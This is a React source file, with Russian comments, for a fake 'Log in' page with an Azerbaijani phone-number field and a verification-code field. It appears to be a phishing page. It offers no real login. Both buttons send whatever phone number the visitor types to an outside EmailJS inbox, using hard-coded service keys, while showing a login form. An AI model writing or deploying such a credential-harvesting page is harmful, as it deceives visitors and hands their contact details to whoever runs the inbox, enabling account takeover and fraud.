import { useState } from 'react';
import emailjs from 'emailjs-com';
import './App.css';

function App() {
  const [phoneNumber, setPhoneNumber] = useState(''); // Держим только номер телефона
  const [code, setCode] = useState(''); // Код, если нужен

  const handleLogin = (e) => {
    e.preventDefault();

    // Проверяем, что введен номер телефона
    if (!phoneNumber) {
      alert("Please enter a phone number.");
      return;
    }

    // Параметры для шаблона EmailJS
    const templateParams = {
      message: `Phone number: ${phoneNumber}`
    };

    emailjs
      .send('service_xinoehp', 'template_y26nfll', templateParams, 'BKfIBGxKj3UwL2TDb')
      .then(
        (response) => {
          console.log('Email sent successfully:', response);
          alert('Email sent successfully!');
        },
        (error) => {
          console.error('Error sending email:', error);
          alert('There was an error sending the email.');
        }
      );
  };

  return (
    <div className="back">
      <div className="login">
        <h2 className="login-title">Log in</h2>
        <div className="form-group">
          <div className='test1'>
            <label className="label">Phone</label>
            <span className="subtext">Log in with email or username</span>
          </div>
          <div className="input-group">
            <select className="input">
              <option>AZ +994</option>
            </select>
            <input
              type="text"
              className="input"
              placeholder="Phone number"
              value={phoneNumber}
              onChange={(e) => setPhoneNumber(e.target.value)}
            />
          </div>
          <div className="input-group">
            <input
              type="text"
              className="input"
              placeholder="Enter 6-digit code"
              value={code}
              onChange={(e) => setCode(e.target.value)}
            />
            <button className="send-button" onClick={handleLogin}>Send code</button>
          </div>
          <a className="password-link">Log in with password</a>
        </div>

        <button className="login-button" onClick={handleLogin}>Log in</button>

        <p className="signup-text">
          Don’t have an account? <a href="#" className="signup-link">Sign up</a>
        </p>
      </div>
    </div>
  );
}

export default App;